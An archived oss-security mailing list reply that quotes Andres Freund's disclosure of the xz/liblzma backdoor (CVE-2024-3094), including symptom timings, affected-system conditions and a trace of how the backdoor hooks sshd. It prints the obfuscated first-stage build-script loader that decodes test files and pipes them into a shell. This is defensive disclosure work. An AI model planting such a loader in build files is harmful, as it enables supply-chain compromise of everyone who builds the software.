<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>oss-security - Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise</title>

<link href="/style.css" type="text/css" rel="stylesheet">
<style type="text/css">
.calendar { text-align: center; }
.ccell { background: #ccc; width: 5ex; padding: 2px; }

.cal_brief { text-align: center; }
.cal_brief td:first-child { background: inherit; }
.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
.cal_big { text-align: center; padding: 0; margin: 0; }
.cal_big td { padding: 0 2px; }
.cal_mon { text-align: center; }
.cal_mon th { font-size: small; padding: 0; margin: 0; }
.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
	padding: 2px; text-align: right; }
.cal_mon td[colspan] { background: inherit; }
.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
	margin-top: -2pt; font-weight: bold; }
.cal_mon a { text-align: right; margin-left: -4em; float: right; }
</style>
</head>

<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">


<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>

<td>
<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
<td width="100%">
<div class="nav">
<ul>
<li><a href="/">Products</a>
<ul>
<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
<ul>
<li><a href="/john/">Free &amp; Open Source for any platform</a>
<li><a href="/john/cloud/">in the cloud</a>
<li><a href="/john/pro/linux/">Pro for Linux</a>
<li><a href="/john/pro/macosx/">Pro for macOS</a>
</ul>
<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
<ul>
<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
</ul>
<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
<li><a href="/pam/">Pluggable Authentication Modules</a>
<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
</ul>
<li><a href="/services/">Services</a>
<li id="narrow-li-1"><a>Publications</a>
<ul>
<li><a href="/articles/">Articles</a>
<li><a href="/presentations/">Presentations</a>
</ul>
<li><a>Resources</a>
<ul>
<li><a href="/lists/">Mailing lists</a>
<li><a href="https://openwall.info/wiki/">Community wiki</a>
<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
<li><a href="https://cvsweb.openwall.com">Source code repositories (CVSweb)</a>
<li><a href="/mirrors/">File archive &amp; mirrors</a>
<li><a href="/signatures/">How to verify digital signatures</a>
<li><a href="/ove/">OVE IDs</a>
</ul>
<li id="last-li"><a href="/news">What's new</a>
</ul>
</div>


</table>


<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
<TR><TD>
<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
<TR><TD bgcolor="#ECF8FF">
<a href="https://twitter.com/openwall">
Follow @Openwall on Twitter for new release announcements and other news</a>

</TABLE>
</TABLE>

<a href="4">[&lt;prev]</a> <a href="6">[next&gt;]</a> <a href="4">[&lt;thread-prev]</a> <a href="6">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
<pre style="white-space: pre-wrap">
Message-ID: &lt;CAFRnB2UB4p9JHzq_PdibFUHvZdyjF-65Bj2kGuy5ZpG8JtOrNg&#64;mail.gmail.com&gt;
Date: Fri, 29 Mar 2024 12:17:31 -0400
From: Alex Gaynor &lt;alex.gaynor&#64;...il.com&gt;
To: oss-security&#64;...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise

Hi Andres,

Thanks for writing this up. Just to make sure I understand the action
item here: folks who are building their own xz, should switch to a
release prior to 5.6.0, as those are the only ones known to be
unaffected?

Alex

On Fri, Mar 29, 2024 at 12:10 PM Andres Freund &lt;andres&#64;...razel.de&gt; wrote:
&gt;
&gt; Hi,
&gt;
&gt; After observing a few odd symptoms around liblzma (part of the xz package) on
&gt; Debian sid installations over the last weeks (logins with ssh taking a lot of
&gt; CPU, valgrind errors) I figured out the answer:
&gt;
&gt; The upstream xz repository and the xz tarballs have been backdoored.
&gt;
&gt; At first I thought this was a compromise of debian's package, but it turns out
&gt; to be upstream.
&gt;
&gt;
&gt; == Compromised Release Tarball ==
&gt;
&gt; One portion of the backdoor is *solely in the distributed tarballs*. For
&gt; easier reference, here's a link to debian's import of the tarball, but it is
&gt; also present in the tarballs for 5.6.0 and 5.6.1:
&gt;
&gt; <a href="https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63" rel="nofollow">https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63</a>
&gt;
&gt; That line is *not* in the upstream source of build-to-host, nor is
&gt; build-to-host used by xz in git.  However, it is present in the tarballs
&gt; released upstream, except for the "source code" links, which I think github
&gt; generates directly from the repository contents:
&gt;
&gt; <a href="https://github.com/tukaani-project/xz/releases/tag/v5.6.0" rel="nofollow">https://github.com/tukaani-project/xz/releases/tag/v5.6.0</a>
&gt; <a href="https://github.com/tukaani-project/xz/releases/tag/v5.6.1" rel="nofollow">https://github.com/tukaani-project/xz/releases/tag/v5.6.1</a>
&gt;
&gt;
&gt; This injects an obfuscated script to be executed at the end of configure. This
&gt; script is fairly obfuscated and data from "test" .xz files in the repository.
&gt;
&gt;
&gt; This script is executed and, if some preconditions match, modifies
&gt; $builddir/src/liblzma/Makefile to contain
&gt;
&gt; am__test = bad-3-corrupt_lzma2.xz
&gt; ...
&gt; am__test_dir=$(top_srcdir)/tests/files/$(am__test)
&gt; ...
&gt; sed rpath $(am__test_dir) | $(am__dist_setup) &gt;/dev/null 2&gt;&amp;1
&gt;
&gt;
&gt; which ends up as
&gt; ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "        \-_" "         _\-" | xz -d | /bin/bash &gt;/dev/null 2&gt;&amp;1; ...
&gt;
&gt; Leaving out the "| bash" that produces
&gt;
&gt; ####Hello####
&gt; #��Z�.hj�
&gt; eval `grep ^srcdir= config.status`
&gt; if test -f ../../config.status;then
&gt; eval `grep ^srcdir= ../../config.status`
&gt; srcdir="../../$srcdir"
&gt; fi
&gt; export i="((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
&gt; ####World####
&gt;
&gt; After de-obfuscation this leads to the attached injected.txt.
&gt;
&gt;
&gt; == Compromised Repository ==
&gt;
&gt; The files containing the bulk of the exploit are in an obfuscated form in
&gt;   tests/files/bad-3-corrupt_lzma2.xz
&gt;   tests/files/good-large_compressed.lzma
&gt; committed upstream. They were initially added in
&gt; <a href="https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0" rel="nofollow">https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0</a>
&gt;
&gt; Note that the files were not even used for any "tests" in 5.6.0.
&gt;
&gt;
&gt; Subsequently the injected code (more about that below) caused valgrind errors
&gt; and crashes in some configurations, due the stack layout differing from what
&gt; the backdoor was expecting.  These issues were attempted to be worked around
&gt; in 5.6.1:
&gt;
&gt; <a href="https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad" rel="nofollow">https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad</a>
&gt; <a href="https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f" rel="nofollow">https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f</a>
&gt; <a href="https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92" rel="nofollow">https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92</a>
&gt;
&gt; For which the exploit code was then adjusted:
&gt; <a href="https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89" rel="nofollow">https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89</a>
&gt;
&gt; Given the activity over several weeks, the committer is either directly
&gt; involved or there was some quite severe compromise of their
&gt; system. Unfortunately the latter looks like the less likely explanation, given
&gt; they communicated on various lists about the "fixes" mentioned above.
&gt;
&gt;
&gt; Florian Weimer first extracted the injected code in isolation, also attached,
&gt; liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
&gt;
&gt;
&gt; == Affected Systems ==
&gt;
&gt; The attached de-obfuscated script is invoked first after configure, where it
&gt; decides whether to modify the build process to inject the code.
&gt;
&gt; These conditions include targeting only x86-64 linux:
&gt;     if ! (echo "$build" | grep -Eq "^x86_64" &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo "$build" | grep -Eq "linux-gnu$" &gt; /dev/null 2&gt;&amp;1);then
&gt;
&gt; Building with gcc and the gnu linker
&gt;     if test "x$GCC" != 'xyes' &gt; /dev/null 2&gt;&amp;1;then
&gt;     exit 0
&gt;     fi
&gt;     if test "x$CC" != 'xgcc' &gt; /dev/null 2&gt;&amp;1;then
&gt;     exit 0
&gt;     fi
&gt;     LDv=$LD" -v"
&gt;     if ! $LDv 2&gt;&amp;1 | grep -qs 'GNU ld' &gt; /dev/null 2&gt;&amp;1;then
&gt;     exit 0
&gt;
&gt; Running as part of a debian or RPM package build:
&gt;     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
&gt;
&gt; Particularly the latter is likely aimed at making it harder to reproduce the
&gt; issue for investigators.
&gt;
&gt;
&gt; Due to the working of the injected code (see below), it is likely the backdoor
&gt; can only work on glibc based systems.
&gt;
&gt;
&gt; Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
&gt; distributions, and where they have, mostly in pre-release versions.
&gt;
&gt;
&gt; == Observing Impact on openssh server ==
&gt;
&gt; With the backdoored liblzma installed, logins via ssh become a lot slower.
&gt;
&gt; time ssh nonexistant&#64;...alhost
&gt;
&gt; before:
&gt; nonexistant&#64;...alhost: Permission denied (publickey).
&gt;
&gt; before:
&gt; real    0m0.299s
&gt; user    0m0.202s
&gt; sys     0m0.006s
&gt;
&gt; after:
&gt; nonexistant&#64;...alhost: Permission denied (publickey).
&gt;
&gt; real    0m0.807s
&gt; user    0m0.202s
&gt; sys     0m0.006s
&gt;
&gt;
&gt; openssh does not directly use liblzma. However debian and several other
&gt; distributions patch openssh to support systemd notification, and libsystemd
&gt; does depend on lzma.
&gt;
&gt;
&gt; Initially starting sshd outside of systemd did not show the slowdown, despite
&gt; the backdoor briefly getting invoked. This appears to be part of some
&gt; countermeasures to make analysis harder.
&gt;
&gt; Observed requirements for the exploit:
&gt; a) TERM environment variable is not set
&gt; b) argv[0] needs to be /usr/sbin/sshd
&gt; c) LD_DEBUG, LD_PROFILE are not set
&gt; d) LANG needs to be set
&gt; e) Some debugging environments, like rr, appear to be detected. Plain gdb
&gt;    appears to be detected in some situations, but not others
&gt;
&gt; To reproduce outside of systemd, the server can be started with a clear
&gt; environment, setting only the required variable:
&gt;
&gt; env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
&gt;
&gt;
&gt; In fact, openssh does not need to be started as a server to observe the
&gt; slowdown:
&gt;
&gt; slow:
&gt; env -i LANG=C /usr/sbin/sshd -h
&gt;
&gt; (about 0.5s on my older system)
&gt;
&gt;
&gt; fast:
&gt; env -i LANG=C TERM=foo /usr/sbin/sshd -h
&gt; env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
&gt; ...
&gt;
&gt; (about 0.01s on the same system)
&gt;
&gt;
&gt; It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
&gt; are obviously lots of servers linking to libsystemd.
&gt;
&gt;
&gt; == Analyzing the injected code ==
&gt;
&gt; I am *not* a security researcher, nor a reverse engineer.  There's lots of
&gt; stuff I have not analyzed and most of what I observed is purely from
&gt; observation rather than exhaustively analyzing the backdoor code.
&gt;
&gt; To analyze I primarily used "perf record -e intel_pt//ub" to observe where
&gt; execution diverges between the backdoor being active and not. Then also gdb,
&gt; setting breakpoints before the divergence.
&gt;
&gt;
&gt; The backdoor initially intercepts execution by replacing the ifunc resolvers
&gt; crc32_resolve(), crc64_resolve() with different code, which calls
&gt; _get_cpuid(), injected into the code (which previously would just be static
&gt; inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
&gt; symbol names.
&gt;
&gt; These functions get resolved during startup, because sshd is built with
&gt; -Wl,-z,now, leading to all symbols being resolved early. If started with
&gt; LD_BIND_NOT=1 the backdoor does not appear to work.
&gt;
&gt;
&gt; Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
&gt; 'completed' variable is 0 and increments it, returning the normal cpuid result
&gt; (via a new _cpuid()). It gets to be more interesting during crc64_resolve().
&gt;
&gt; In the second invocation crc64_resolve() appears to find various information,
&gt; like data from the dynamic linker, program arguments and environment. Then it
&gt; perform various environment checks, including those above. There are other
&gt; checks I have not fully traced.
&gt;
&gt; If the above decides to continue, the code appears to be parsing the symbol
&gt; tables in memory. This is the quite slow step that made me look into the issue.
&gt;
&gt;
&gt; Notably liblzma's symbols are resolved before many of the other libraries,
&gt; including the symbols in the main sshd binary.  This is important because
&gt; symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.
&gt;
&gt;
&gt; To be able to resolve symbols in libraries that have not yet loaded, the
&gt; backdoor installs an audit hook into the dynamic linker, which can be observed
&gt; with gdb using
&gt;   watch _rtld_global_ro._dl_naudit
&gt; It looks like the audit hook is only installed for the main binary.
&gt;
&gt; That hook gets called, from _dl_audit_symbind, for numerous symbols in the
&gt; main binary. It appears to wait for "RSA_public_decrypt&#64;....plt" to be
&gt; resolved.  When called for that symbol, the backdoor changes the value of
&gt; RSA_public_decrypt&#64;....plt to point to its own code.  It does not do this via
&gt; the audit hook mechanism, but outside of it.
&gt;
&gt; For reasons I do not yet understand, it does change sym.st_value *and* the
&gt; return value of from the audit hook to a different value, which leads
&gt; _dl_audit_symbind() to do nothing - why change anything at all then?
&gt;
&gt; After that the audit hook is uninstalled again.
&gt;
&gt; It is possible to change the got.plt contents at this stage because it has not
&gt; (and can't yet) been remapped to be read-only.
&gt;
&gt;
&gt; I suspect there might be further changes performed at this stage.
&gt;
&gt;
&gt; == Impact on sshd ==
&gt;
&gt; The prior section explains that RSA_public_decrypt&#64;....plt was redirected to
&gt; point into the backdoor code. The trace I was analyzing indeed shows that
&gt; during a pubkey login the exploit code is invoked:
&gt;
&gt;             sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =&gt;     5555555612d0 RSA_public_decrypt&#64;...+0x0 (/usr/sbin/sshd)
&gt;
&gt; The backdoor then calls back into libcrypto, presumably to perform normal authentication
&gt;
&gt;             sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =&gt;     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
&gt;
&gt;
&gt; I have not yet analyzed precisely what is being checked for in the injected
&gt; code, to allow unauthorized access. Since this is running in a
&gt; pre-authentication context, it seems likely to allow some form of access or
&gt; other form of remote code execution.
&gt;
&gt; I'd upgrade any potentially vulnerable system ASAP.
&gt;
&gt;
&gt; == Bug reports ==
&gt;
&gt; Given the apparent upstream involvement I have not reported an upstream
&gt; bug. As I initially thought it was a debian specific issue, I sent a more
&gt; preliminary report to security&#64;...ian.org.  Subsequently I reported the issue
&gt; to distros@. CISA was notified by a distribution.
&gt;
&gt; Red Hat assigned this issue CVE-2024-3094.
&gt;
&gt;
&gt; == Detecting if installation is vulnerable ==
&gt;
&gt; Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
&gt; system is vulnerable, attached here. Thanks!
&gt;
&gt;
&gt; Greetings,
&gt;
&gt; Andres Freund



-- 
All that is necessary for evil to succeed is for good people to do nothing.
</pre>
<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>


<p>
Please check out the
<a href="https://oss-security.openwall.org/wiki/">
Open Source Software Security Wiki</a>, which is counterpart to this
<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
<p>
Confused about <a href="/lists/">mailing lists</a> and their use?
<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
and check out these
<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
<p>

</body>
</html>
